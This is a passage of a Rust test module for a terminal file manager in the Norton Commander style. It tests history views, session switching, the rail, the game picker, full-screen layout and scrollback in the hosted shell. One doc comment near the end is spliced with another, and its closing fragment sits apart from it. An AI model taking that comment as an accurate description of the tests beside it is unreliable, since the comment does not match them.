    }

    /// Three readings of the same history, on the three keys the bar advertises.
    #[tokio::test]
    async fn the_function_keys_switch_between_the_views() {
        use dmac_core::history::Order;
        let mut app = fixture();
        let now = dmac_core::history::now();
        // Used often, long ago, by another session.
        for _ in 0..5 {
            app.sessions.history.record("/often", 99, now - 10_000);
        }
        // Visited once, just now, by this one.
        app.sessions
            .history
            .record("/just-now", app.ses().id.0, now);

        app.handle(Action::DirectoryHistory);
        app.on_key(key(KeyCode::F(1)));
        assert_eq!(app.history_order, Order::Recent);
        assert_eq!(app.history_rows()[0].row.path, "/just-now");

        app.on_key(key(KeyCode::F(2)));
        assert_eq!(app.history_order, Order::Frequent);
        assert_eq!(app.history_rows()[0].row.path, "/often");

        app.on_key(key(KeyCode::F(3)));
        assert_eq!(app.history_order, Order::Session);
        let mine: Vec<String> = app.history_rows().into_iter().map(|r| r.row.path).collect();
        assert_eq!(mine, ["/just-now"], "another session's rows are not mine");

        app.on_key(key(KeyCode::F(4)));
        assert_eq!(app.history_order, Order::Sessions);

        // Tab reaches every view, for terminals that eat function keys.
        app.on_key(key(KeyCode::Tab));
        assert_eq!(app.history_order, Order::Recent);
    }

    /// The fourth view lists the sessions themselves, filtered the same way and
    /// reached by the same keys — one picker for "where have I been", whether
    /// the answer is a directory or a session.
    #[tokio::test]
    async fn the_fourth_view_lists_sessions_and_switches_to_one() {
        use dmac_core::history::Order;
        let mut app = fixture();
        app.handle(Action::NewSession);
        app.mode = Mode::Normal;
        let _ = app.sessions.rename(1, "backend");
        let backend = app.sessions.all()[1].id.0;
        app.sessions.switch_to(0);

        app.handle(Action::DirectoryHistory);
        app.on_key(key(KeyCode::F(4)));
        assert_eq!(app.history_order, Order::Sessions);

        let rows = app.history_rows();
        assert_eq!(rows.len(), app.sessions.len(), "every session is listed");
        assert!(
            rows.iter().all(|r| r.row.session.is_some()),
            "a session row has to say which session it is"
        );

        // Typing filters by name, so a session is reachable without counting.
        app.on_key(key(KeyCode::Char('b')));
        app.on_key(key(KeyCode::Char('a')));
        let filtered = app.history_rows();
        assert!(
            filtered.iter().any(|r| r.row.path.starts_with("backend")),
            "the filter lost the session it should have found: {:?}",
            filtered.iter().map(|r| &r.row.path).collect::<Vec<_>>()
        );

        // Enter on a session row switches to it rather than navigating.
        let i = filtered
            .iter()
            .position(|r| r.row.session == Some(backend))
            .expect("backend is in the filtered list");
        app.mode = Mode::History { selected: i };
        app.on_key(key(KeyCode::Enter));
        assert_eq!(app.sessions.current().id.0, backend);
        assert_eq!(app.mode, Mode::Normal, "the picker should have closed");
    }

    /// Changing the order must move the highlight back to the top: the row that
    /// was under it means something else in a differently ordered list.
    #[tokio::test]
    async fn reordering_resets_the_highlight() {
        let mut app = fixture();
        let now = dmac_core::history::now();
        for p in ["/a", "/b", "/c"] {
            app.sessions.history.record(p, 0, now);
        }
        app.handle(Action::DirectoryHistory);
        app.on_key(key(KeyCode::Down));
        assert!(matches!(app.mode, Mode::History { selected: 1 }));
        app.on_key(key(KeyCode::F(2)));
        assert!(matches!(app.mode, Mode::History { selected: 0 }));
    }

    #[tokio::test]
    async fn escape_closes_it_and_forgets_the_filter() {
        let mut app = fixture();
        app.handle(Action::DirectoryHistory);
        app.on_key(key(KeyCode::Char('x')));
        assert_eq!(app.history_filter, "x");
        app.on_key(key(KeyCode::Esc));
        assert_eq!(app.mode, Mode::Normal);
        assert!(app.history_filter.is_empty(), "next time starts clean");
    }

    /// The history draws over whatever was there, and brings its own F-key bar
    /// — including over a shell, where there normally is none.
    #[tokio::test]
    async fn the_history_renders_with_its_own_key_bar() {
        let mut app = fixture();
        app.sessions
            .history
            .record("/home/me/prj", 0, dmac_core::history::now());
        app.handle(Action::DirectoryHistory);

        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let text: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();

        assert!(text.contains("Directories"), "the list is on screen");
        assert!(text.contains("Recent"), "and so are its own F-keys");
        assert!(text.contains("MostUsed"));
        assert!(text.contains("Session"));
        assert!(
            !text.contains("MkDir"),
            "the normal bar is gone: it would be advertising keys the list has taken"
        );
    }

    /// Backspace is the key everyone reaches for to leave a directory. It only
    /// belongs to the quick search while the search has something to delete.
    // Leaving a directory starts a listing, so this needs a runtime.
    #[tokio::test]
    async fn backspace_leaves_the_directory_when_nothing_is_being_searched() {
        let mut app = fixture();
        assert_eq!(app.ses().cwd[0], VfsPath::local("/left"));

        app.handle(Action::QuickSearchBackspace);
        assert_eq!(
            app.ses().cwd[0],
            VfsPath::local("/"),
            "an empty search buffer means Backspace goes up"
        );
    }

    /// The other half of the same rule: a search in progress keeps the key, so
    /// a typo does not throw you out of the directory you were searching.
    #[tokio::test]
    async fn backspace_edits_the_search_before_it_leaves() {
        let mut app = fixture();
        app.handle(Action::QuickSearch('s'));
        app.handle(Action::QuickSearch('r'));

        app.handle(Action::QuickSearchBackspace);
        assert_eq!(app.quick_search, "s", "it deletes a character first");
        assert_eq!(app.ses().cwd[0], VfsPath::local("/left"), "and stays put");

        app.handle(Action::QuickSearchBackspace);
        assert_eq!(app.quick_search, "", "the buffer empties");
        assert_eq!(app.ses().cwd[0], VfsPath::local("/left"), "still put");

        app.handle(Action::QuickSearchBackspace);
        assert_eq!(app.ses().cwd[0], VfsPath::local("/"), "now it goes up");
    }

    #[tokio::test]
    async fn a_new_session_opens_on_the_current_directory() {
        let mut app = fixture();
        let before = app.ses().cwd[0].clone();
        app.handle(Action::NewSession);
        assert_eq!(app.sessions.len(), 2);
        assert_eq!(
            app.ses().cwd[0],
            before,
            "a new session starts where you are"
        );
    }

    /// The property that makes the rail worth having: switching does not reload,
    /// so each session keeps the listing and cursor it had.
    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn switching_sessions_preserves_each_ones_listing_and_cursor() {
        let mut app = fixture();
        app.ses_mut().active_panel_mut().move_to(3);
        app.handle(Action::NewSession);
        app.ses_mut().panels[0].set_entries(vec![dmac_core::Entry::parent()]);

        app.handle(Action::SwitchSession(0));
        assert_eq!(app.ses().active_panel().cursor(), 3, "cursor must survive");
        assert_eq!(app.ses().panels[0].len(), 5, "listing must survive");

        app.handle(Action::SwitchSession(1));
        assert_eq!(app.ses().panels[0].len(), 1);
    }

    #[test]
    fn the_rail_toggles_and_starts_closed() {
        let mut app = fixture();
        assert!(!app.rail_open);
        app.handle(Action::ToggleRail);
        assert!(app.rail_open);
        app.handle(Action::ToggleRail);
        assert!(!app.rail_open);
    }

    /// The rail is resizable, and the two widths are separate settings: the
    /// resting strip and the opened list answer different questions, and one
    /// width would make one of them wrong.
    #[test]
    fn the_rail_is_resized_separately_at_rest_and_open() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let start = app.sessions.rail;

        // Open it, widen it, and the resting strip must not have moved.
        app.handle(Action::ToggleRail);
        assert!(
            matches!(app.mode, Mode::Rail { .. }),
            "the rail has the keys"
        );
        for _ in 0..4 {
            app.on_key(key(KeyCode::Right));
        }
        assert_eq!(app.sessions.rail.expanded, start.expanded + 4);
        assert_eq!(app.sessions.rail.collapsed, start.collapsed);

        // Closed, the same keys move the other one.
        app.close_rail();
        app.mode = Mode::Rail { selected: 0 };
        for _ in 0..5 {
            app.on_key(key(KeyCode::Char('+')));
        }
        assert_eq!(app.sessions.rail.collapsed, start.collapsed + 5);
        assert_eq!(app.sessions.rail.expanded, start.expanded + 4);
    }

    /// A rail that could eat the panels is a rail that eventually will, and one
    /// that could go negative would panic on the way. Neither is allowed.
    #[test]
    fn the_rail_cannot_be_dragged_past_a_third_of_the_screen_or_below_nothing() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();

        app.set_rail_width(u16::MAX);
        assert_eq!(app.sessions.rail.collapsed, 40, "a third of 120 columns");

        for _ in 0..80 {
            app.resize_rail(-1);
        }
        assert_eq!(app.sessions.rail.collapsed, 0, "at rest it may vanish");

        // Opened it may not: a list you cannot see is a list you cannot leave.
        app.rail_open = true;
        for _ in 0..80 {
            app.resize_rail(-1);
        }
        assert_eq!(app.sessions.rail.expanded, 1);
    }

    /// Widening the resting strip is how you ask to see the sessions all the
    /// time. A strip that stayed a column of dots however wide it was made
    /// would be answering a question nobody asked.
    #[test]
    fn a_widened_resting_rail_shows_the_session_names() {
        let mut app = fixture();
        app.sessions.rail.collapsed = 20;
        assert!(!app.rail_open, "still at rest");

        let mut term = Terminal::new(TestBackend::new(120, 30)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        assert_eq!(app.layout.rail_outer.width, 20);

        let name = &app.sessions.current().name;
        let text: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect::<Vec<_>>()
            .concat();
        assert!(text.contains(name.as_str()), "the rail showed no names");
    }

    /// A shortcut that does nothing must say why, or it is indistinguishable
    /// from a broken binding.
    #[test]
    fn switching_to_a_session_that_does_not_exist_explains_itself() {
        let mut app = fixture();
        app.handle(Action::SwitchSession(6));
        assert_eq!(app.sessions.current_index(), 0);
        assert!(app.status.contains("no session 7"), "got {:?}", app.status);
    }

    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn cycling_sessions_wraps() {
        let mut app = fixture();
        app.handle(Action::NewSession);
        app.handle(Action::NewSession);
        app.handle(Action::SwitchSession(0));
        app.handle(Action::CycleSession(-1));
        assert_eq!(app.sessions.current_index(), 2);
        app.handle(Action::CycleSession(1));
        assert_eq!(app.sessions.current_index(), 0);
    }

    /// Closing the last session must not become a way to quit by accident.
    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn closing_the_last_session_is_refused_and_points_at_f10() {
        let mut app = fixture();
        app.handle(Action::CloseSession);
        assert_eq!(app.sessions.len(), 1);
        assert!(!app.should_quit, "closing a session must never quit");
        assert!(app.status.contains("F10"), "got {:?}", app.status);
    }

    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn closing_a_session_leaves_the_others_intact() {
        let mut app = fixture();
        app.handle(Action::NewSession);
        app.handle(Action::NewSession);
        assert_eq!(app.sessions.len(), 3);
        app.handle(Action::CloseSession);
        assert_eq!(app.sessions.len(), 2);
        assert!(app.sessions.current_index() < 2);
    }

    /// Transient per-view state belongs to the view, not to the next session.
    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn switching_sessions_clears_the_open_menu_and_any_drag() {
        let mut app = fixture();
        app.handle(Action::NewSession);
        app.handle(Action::ScreensaverMenu);
        assert_ne!(app.mode, Mode::Normal);
        app.handle(Action::SwitchSession(0));
        assert_eq!(
            app.mode,
            Mode::Normal,
            "an overlay must not follow you across"
        );
    }

    // Creating a session spawns its directory listing, so this needs a runtime.
    #[tokio::test]
    async fn each_session_remembers_its_own_focus_and_command_line() {
        let mut app = fixture();
        app.handle(Action::CommandChar('a'));
        app.handle(Action::FocusToggle);
        let focus_a = app.ses().focus;

        app.handle(Action::NewSession);
        app.handle(Action::CommandChar('b'));

        app.handle(Action::SwitchSession(0));
        assert_eq!(app.ses().command_line, "a");
        assert_eq!(app.ses().focus, focus_a);
        app.handle(Action::SwitchSession(1));
        assert_eq!(app.ses().command_line, "b");
    }

    // ---- the picker ----

    #[test]
    fn the_menu_key_opens_the_picker_and_esc_closes_it() {
        let mut app = fixture();
        app.handle(Action::ScreensaverMenu);
        assert_eq!(app.mode, Mode::Picker { selected: 0 });
        app.picker_key(
            KeyEvent::new(KeyCode::Esc, ratatui::crossterm::event::KeyModifiers::NONE),
            0,
        );
        assert_eq!(app.mode, Mode::Normal);
    }

    #[test]
    fn picker_navigation_wraps_at_both_ends() {
        let mut app = fixture();
        let rows = crate::ui::picker::row_count(dmac_fx::catalog());
        app.handle(Action::ScreensaverMenu);
        app.picker_key(
            KeyEvent::new(KeyCode::Up, ratatui::crossterm::event::KeyModifiers::NONE),
            0,
        );
        assert_eq!(app.mode, Mode::Picker { selected: rows - 1 });
        app.picker_key(
            KeyEvent::new(KeyCode::Down, ratatui::crossterm::event::KeyModifiers::NONE),
            rows - 1,
        );
        assert_eq!(app.mode, Mode::Picker { selected: 0 });
    }

    #[test]
    fn choosing_a_game_from_the_picker_starts_it() {
        let mut app = fixture();
        let catalog = dmac_fx::catalog();
        let snake = (0..crate::ui::picker::row_count(catalog))
            .find(|&i| crate::ui::picker::name_at(catalog, i) == "snake")
            .expect("snake is in the catalog");
        app.start_picked(snake);
        assert_eq!(app.mode, Mode::Normal);
        assert_eq!(app.screensaver.current(), Some("snake"));
    }

    /// While a game runs, arrow keys steer it — they must not reach the panels.
    #[test]
    fn a_running_game_keeps_the_arrow_keys() {
        let mut app = fixture();
        app.screensaver
            .start_with(dmac_fx::build("snake").expect("snake"), 60, 20);
        let before = app.ses_mut().panels[0].cursor();
        app.on_key(KeyEvent::new(
            KeyCode::Down,
            ratatui::crossterm::event::KeyModifiers::NONE,
        ));
        assert_eq!(
            app.ses_mut().panels[0].cursor(),
            before,
            "the game must keep the key"
        );
        assert!(app.screensaver.is_active());
    }

    /// And the key that dismisses a screensaver must not also act on the panels.
    #[test]
    fn the_key_that_wakes_the_screen_does_not_reach_the_panels() {
        let mut app = fixture();
        app.screensaver
            .start_with(dmac_fx::build("matrix").expect("matrix"), 60, 20);
        let before = app.ses_mut().panels[0].cursor();
        app.on_key(KeyEvent::new(
            KeyCode::Down,
            ratatui::crossterm::event::KeyModifiers::NONE,
        ));
        assert!(!app.screensaver.is_active(), "it must be dismissed");
        assert_eq!(
            app.ses_mut().panels[0].cursor(),
            before,
            "and the key must be swallowed"
        );
    }

    /// Pressing the same sort key twice reverses the order rather than being a
    /// no-op — this is how every orthodox file manager behaves.
    #[test]
    fn repeating_a_sort_key_reverses_it() {
        let mut app = fixture();
        app.handle(Action::SortBy(dmac_core::SortKey::Size));
        assert_eq!(app.ses_mut().panels[0].sort_order, SortOrder::Ascending);
        app.handle(Action::SortBy(dmac_core::SortKey::Size));
        assert_eq!(app.ses_mut().panels[0].sort_order, SortOrder::Descending);
    }

    /// Full screen takes the frame off and leaves the contents. If a border
    /// survives it, the mode has not done the one thing it is for.
    #[test]
    fn full_screen_removes_every_border_and_the_f_key_bar() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();

        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let framed: String = term
            .backend()
            .buffer()
            .content()
            .iter()
            .map(|c| c.symbol())
            .collect();
        assert!(framed.contains('│'), "the normal frame should have borders");

        app.handle(Action::ToggleFullscreen);
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let buf = term.backend().buffer();
        let bare: String = buf.content().iter().map(|c| c.symbol()).collect();

        // Corners only, plus the columns a box would occupy. A filename can
        // legitimately contain '│' — the fixture has one — so the bare glyph is
        // not evidence of a border, and asserting on it tests the fixture.
        for ch in ['┌', '┐', '└', '┘'] {
            assert!(
                !bare.contains(ch),
                "full screen still draws a box corner {ch:?}"
            );
        }
        for y in 0..23 {
            for x in [0u16, 40, 79] {
                let c = buf[(x, y)].symbol();
                assert_ne!(c, "│", "a panel edge survived at {x},{y}");
            }
        }
        let last: String = (0..80).map(|x| buf[(x, 23)].symbol().to_string()).collect();
        assert!(
            !last.contains("Copy"),
            "the F-key bar should be gone: {last:?}"
        );
    }

    /// Black, not Norton blue: full screen is for looking at contents, and blue
    /// reads as a surface holding something.
    #[test]
    fn full_screen_paints_the_background_black() {
        let mut app = fixture();
        app.handle(Action::ToggleFullscreen);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();

        let buf = term.backend().buffer();
        let blue = buf
            .content()
            .iter()
            .filter(|c| c.style().bg == Some(ratatui::style::Color::Blue))
            .count();
        assert_eq!(blue, 0, "{blue} cells are still Norton blue");
    }

    /// Half of a narrow window is not a panel. A name, a size and a date do not
    /// fit in it, so side by side both columns show truncated names and nothing
    /// else — while stacked, each keeps the full width and pays in rows, which
    /// is the cheaper thing to lose: a listing scrolls, a filename does not.
    #[test]
    fn a_narrow_window_stacks_the_panels_instead_of_shrinking_them() {
        let mut app = fixture();

        let mut wide = Terminal::new(TestBackend::new(120, 30)).unwrap();
        wide.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let [l, r] = app.layout.panels;
        assert_eq!(l.y, r.y, "at 120 columns they must sit side by side");
        assert!(l.x < r.x, "and left really is on the left");

        let mut narrow = Terminal::new(TestBackend::new(60, 30)).unwrap();
        narrow.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let [top, bottom] = app.layout.panels;
        assert_eq!(top.x, bottom.x, "at 60 columns they must stack");
        assert!(top.y < bottom.y, "and left becomes the top one");
        assert_eq!(
            top.width, bottom.width,
            "stacked panels each take the whole width"
        );
        // Half of 60 columns is 30, and a panel that narrow shows a truncated
        // name and nothing else. Stacked it keeps very nearly the whole window.
        assert!(
            top.width > 45,
            "a stacked panel got only {} of 60 columns",
            top.width
        );
    }

    /// The history mixes directories with sessions, and F5 has to mean the same
    /// thing on both: open where that row is. A session row names a session,
    /// not a path, so it has to be resolved to the directory that session is in.
    #[test]
    fn f5_resolves_both_kinds_of_history_row_to_a_directory() {
        let mut app = fixture();
        app.seed_history();
        app.handle(Action::DirectoryHistory);
        assert!(matches!(app.mode, Mode::History { .. }), "history is open");

        // Both kinds have to be on screen, or this proves only one of them.
        app.set_history_order(dmac_core::history::Order::Sessions);
        let sessions = app.history_rows();
        assert!(
            sessions.iter().any(|r| r.row.session.is_some()),
            "no session rows to test against"
        );
        app.set_history_order(dmac_core::history::Order::Recent);
        let directories = app.history_rows();
        assert!(
            directories.iter().any(|r| r.row.session.is_none()),
            "no directory rows to test against"
        );

        for order in [
            dmac_core::history::Order::Sessions,
            dmac_core::history::Order::Recent,
        ] {
            app.set_history_order(order);
            let rows = app.history_rows();
            assert!(!rows.is_empty(), "nothing seeded to select");

            for (i, shown) in rows.iter().enumerate() {
                let is_session = shown.row.session.is_some();
                let target = app.editor_target(i);
                assert!(
                    target.is_ok(),
                    "row {i} ({}) resolved to nothing: {target:?}",
                    if is_session { "session" } else { "directory" }
                );
                let dir = target.unwrap_or_default();
                assert!(
                    dir.is_absolute(),
                    "an editor needs a real path, got {dir:?}"
                );
                if is_session {
                    assert!(
                        !dir.to_string_lossy().contains(" \u{2014} "),
                        "a session row's label leaked into the path: {dir:?}"
                    );
                }
            }
        }
    }

    /// A row past the end is a row nobody selected. It must say so rather than
    /// opening whatever happens to be first.
    #[test]
    fn f5_on_a_row_that_is_not_there_opens_nothing() {
        let mut app = fixture();
        app.seed_history();
        app.handle(Action::DirectoryHistory);
        assert!(
            app.editor_target(9999).is_err(),
            "a selection past the end must not resolve to a directory"
        );
    }

    /// 80x24 is the canonical size, not a narrow window. Norton Commander drew
    /// two panels side by side on it and so must this — stacking there would be
    /// a surprise rather than a rescue.
    #[test]
    fn eighty_columns_is_still_two_panels_side_by_side() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let [l, r] = app.layout.panels;
        assert_eq!(l.y, r.y, "80 columns must stay side by side");
        assert!(l.x < r.x);
    }

    /// Stacking spends rows, and there is a point below which there are none to
    /// spend. Two panels three rows tall are worse than two narrow ones.
    #[test]
    fn a_window_with_no_rows_to_spare_stays_side_by_side() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(60, 12)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let [l, r] = app.layout.panels;
        assert_eq!(l.y, r.y, "too short to stack, so side by side it stays");
        assert!(l.x < r.x);
    }

    /// The row the F-key bar gave up has to go to the listing, or the mode costs
    /// a border and buys nothing.
    #[test]
    fn full_screen_gives_its_rows_to_the_listing() {
        let mut app = fixture();
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let framed = app.layout.panels[0].height;

        app.handle(Action::ToggleFullscreen);
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        let bare = app.layout.panels[0].height;

        assert!(
            bare > framed,
            "full screen showed {bare} rows against {framed} framed"
        );
    }

    #[test]
    fn f11_is_full_screen_and_toggles_back() {
        use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        assert_eq!(
            keymap::resolve(
                KeyEvent::new(KeyCode::F(11), KeyModifiers::NONE),
                Focus::Panel
            ),
            Some(Action::ToggleFullscreen)
        );
        let mut app = fixture();
        assert!(!app.fullscreen);
        app.handle(Action::ToggleFullscreen);
        assert!(app.fullscreen);
        app.handle(Action::ToggleFullscreen);
        assert!(!app.fullscreen);
    }

    /// The collapsed strip is a hint and goes with the rest of the frame, but a
    /// rail you opened on purpose is contents and must still work.
    #[test]
    fn the_rail_still_opens_in_full_screen() {
        let mut app = fixture();
        app.handle(Action::ToggleFullscreen);
        app.handle(Action::ToggleRail);
        let mut term = Terminal::new(TestBackend::new(80, 24)).unwrap();
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        assert!(
            app.layout.rail.width > 0,
            "the rail vanished in full screen"
        );
    }

    /// A shell view sized and filled, with more printed than fits on screen.
    #[cfg(unix)]
    fn shell_with_scrollback() -> (App, Terminal<TestBackend>) {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        let mut term = Terminal::new(TestBackend::new(80, 12)).unwrap();
        // One frame first, so the pane has a size and the PTY is told about it.
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        app.sync_shell_size();

        app.run_line("i=1; while [ $i -le 60 ]; do echo line-$i; i=$((i+1)); done")
            .expect("run");
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while std::time::Instant::now() < deadline {
            let seen = app
                .ses()
                .hosted()
                .and_then(|sh| sh.with_screen(|s| s.contents()))
                .unwrap_or_default();
            if seen.contains("line-60") {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
        std::thread::sleep(std::time::Duration::from_millis(80));
        term.draw(|f| crate::ui::draw(f, &mut app)).unwrap();
        (app, term)
    }

    fn with(code: KeyCode, m: KeyModifiers) -> KeyEvent {
        KeyEvent::new(code, m)
    }

    /// What scrolled off the top has to be reachable from the keyboard.
    /// Shift-PageUp is the key every terminal already has, so it is the one
    /// that has to work without being told about.
    #[cfg(unix)]
    #[test]
    fn shift_page_up_reads_back_through_the_shell() {
        let (mut app, _term) = shell_with_scrollback();
        assert_eq!(app.shell_back(), 0, "a fresh pane looks at the live screen");

        app.on_key(with(KeyCode::PageUp, KeyModifiers::SHIFT));
        let back = app.shell_back();
        assert!(back > 0, "Shift-PageUp did not move the view");
        assert!(
            app.shell_selection.is_none(),
            "looking back is not selecting"
        );

        // A line at a time, and all the way to either end.
        app.on_key(with(
            KeyCode::Up,
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        ));
        assert_eq!(app.shell_back(), back + 1);
        app.on_key(with(
            KeyCode::Home,
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        ));
        assert!(app.shell_back() > back + 1, "Ctrl-Shift-Home went nowhere");

        app.on_key(with(
            KeyCode::End,
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        ));
        assert_eq!(app.shell_back(), 0, "Ctrl-Shift-End must reach the bottom");
    }

    /// Typing is how you say you have finished reading. A pane that stayed
    /// where it was would hide the echo of what was just typed.
    #[cfg(unix)]
    #[test]
    fn typing_snaps_the_shell_back_to_the_live_screen() {
        let (mut app, _term) = shell_with_scrollback();
        app.on_key(with(KeyCode::PageUp, KeyModifiers::SHIFT));
        assert!(app.shell_back() > 0);

        app.on_key(key(KeyCode::Char('x')));
        assert_eq!(app.shell_back(), 0, "the view stayed behind");
    }

    /// Shift-selection over a hosted shell, growing past the top of the view.
    /// Stopping at row 0 while the key is still held would look exactly like a
    /// selection that had worked, which is the worst way for it to fail.
    #[cfg(unix)]
    #[test]
    fn shift_selection_over_the_shell_runs_past_one_screenful() {
        let (mut app, _term) = shell_with_scrollback();
        let rows = app.layout.shell.height;
        assert!(rows >= 4, "the pane is only {rows} rows tall");

        // Up past the top of the pane: twice its height, plus a few.
        for _ in 0..(rows * 2 + 3) {
            app.on_key(with(KeyCode::Up, KeyModifiers::SHIFT));
        }
        assert!(
            app.shell_back() > 0,
            "the selection did not carry the view with it"
        );
        let sel = app.shell_selection.expect("nothing was selected");
        assert!(!sel.is_empty());

        let text = sel.text(app.ses().hosted().expect("a shell"));
        let numbers: Vec<u32> = text
            .lines()
            .filter_map(|l| l.trim().strip_prefix("line-"))
            .filter_map(|n| n.parse().ok())
            .collect();
        assert!(
            numbers.len() > usize::from(rows),
            "only {} lines selected in a {rows}-row pane: {text:?}",
            numbers.len()
        );
        for pair in numbers.windows(2) {
            assert_eq!(pair[1], pair[0] + 1, "out of order in {numbers:?}");
        }

        // Esc is the way out, and only while there is something to get out of.
        app.on_key(key(KeyCode::Esc));
        assert!(app.shell_selection.is_none());
        assert_eq!(app.shell_back(), 0);
    }

    /// The view moving must not move the highlight off its own characters.
    #[cfg(unix)]
    #[test]
    fn looking_further_back_leaves_a_selection_on_its_own_text() {
        let (mut app, _term) = shell_with_scrollback();
        for _ in 0..3 {
            app.on_key(with(KeyCode::Up, KeyModifiers::SHIFT));
        }
        let shell = app.ses().hosted().expect("a shell");
        let before = app.shell_selection.expect("a selection").text(shell);
        assert!(before.contains("line-"), "nothing selected: {before:?}");

        app.on_key(with(
            KeyCode::Up,
            KeyModifiers::CONTROL | KeyModifiers::SHIFT,
        ));
        let shell = app.ses().hosted().expect("a shell");
        let after = app.shell_selection.expect("a selection").text(shell);
        assert_eq!(after, before, "the highlight slid off its text");
    }

    /// Output arriving while the view is scrolled back must not take the
    /// selection with it: `vt100` holds the visible rows still, so the
    /// highlight is still on the characters it was put on.
    #[cfg(unix)]
    #[test]
    fn a_selection_survives_output_while_the_view_is_held_back() {
        let (mut app, _term) = shell_with_scrollback();
        app.on_key(with(KeyCode::PageUp, KeyModifiers::SHIFT));
        let back = app.shell_back();
        assert!(back > 0, "nothing to hold back from");

        for _ in 0..3 {
            app.on_key(with(KeyCode::Up, KeyModifiers::SHIFT));
        }
        assert!(app.shell_selection.is_some());
        assert_eq!(
            app.shell_back(),
            back,
            "selecting after reading back must not throw the view away"
        );

        // Whatever the pane thinks it owes a repaint for, the selection stays.
        app.before_frame();
        assert!(
            app.shell_selection.is_some(),
            "scrolled back, nothing has moved under the highlight"
        );
    }

    /// A hosted CLI you cannot see the cursor of is a CLI you cannot tell is
    /// waiting for you. The style is re-asserted every frame that shows one, so
    /// Apple's Terminal sends Ctrl-Shift-H as byte `0x08` — exactly what Ctrl-H
    /// and Backspace send — so from inside a shell, where `0x08` belongs to the
    /// child, the history had no way of being reached at all. These two are the
    /// way in for terminals that cannot report a modifier they were never told
    /// about.
    #[cfg(unix)]
    #[test]
    fn the_history_is_reachable_from_a_shell_without_modifier_support() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);

        app.on_key(key(KeyCode::F(12)));
        assert!(
            matches!(app.mode, Mode::History { .. }),
            "F12 did not open the history from inside a shell"
        );
        app.mode = Mode::Normal;

        app.on_key(key(KeyCode::F(9)));
        assert!(
            matches!(app.mode, Mode::Utilities { .. }),
            "F9 did not open the utilities from inside a shell"
        );
    }

    /// Ctrl-O, then one letter. Ctrl-O is already reserved and no shell wants
    /// it, so a chord built on it needs no modifier support whatsoever.
    #[cfg(unix)]
    #[test]
    fn ctrl_o_then_a_letter_reaches_the_history_and_the_utilities() {
        for (letter, opens_history) in [('h', true), ('u', false)] {
            let mut app = fixture();
            app.handle(Action::ToggleShell);
            assert_eq!(app.ses().view, View::Shell);

            app.handle(Action::ToggleShell); // Ctrl-O, back to the panels
            assert_eq!(app.ses().view, View::Panels);
            app.on_key(key(KeyCode::Char(letter)));

            if opens_history {
                assert!(
                    matches!(app.mode, Mode::History { .. }),
                    "Ctrl-O h did not open the history"
                );
            } else {
                assert!(
                    matches!(app.mode, Mode::Utilities { .. }),
                    "Ctrl-O u did not open the utilities"
                );
            }
        }
    }

    /// The chord lasts one key and claims only the letters it names. Everything
    /// else has to behave exactly as though it had never been armed, or leaving
    /// a shell would quietly swallow the start of a quick search.
    #[cfg(unix)]
    #[test]
    fn the_chord_lasts_one_key_and_lets_everything_else_through() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        app.handle(Action::ToggleShell);
        assert!(app.chord, "leaving a shell arms the chord");

        app.on_key(key(KeyCode::Char('c')));
        assert!(!app.chord, "the chord did not disarm after one key");
        assert!(
            matches!(app.mode, Mode::Normal),
            "an unrelated letter must not open anything"
        );

        // And a second `h`, with nothing armed, is an ordinary keypress again.
        app.on_key(key(KeyCode::Char('h')));
        assert!(
            matches!(app.mode, Mode::Normal),
            "the chord fired without Ctrl-O having been pressed"
        );
    }

    /// Coming *into* a shell there is nothing to escape from, and an armed
    /// chord would eat the first letter typed at the prompt.
    #[cfg(unix)]
    #[test]
    fn entering_a_shell_arms_nothing() {
        let mut app = fixture();
        app.handle(Action::ToggleShell);
        assert_eq!(app.ses().view, View::Shell);
        assert!(!app.chord, "entering a shell must not arm the chord");
    }

    /// this predicate is also what makes it blink.
    #[cfg(unix)]
    #[test]
    fn the_hosted_shell_gets_a_visible_cursor() {
        let mut app = fixture();
        assert!(
            !app.wants_text_cursor(),
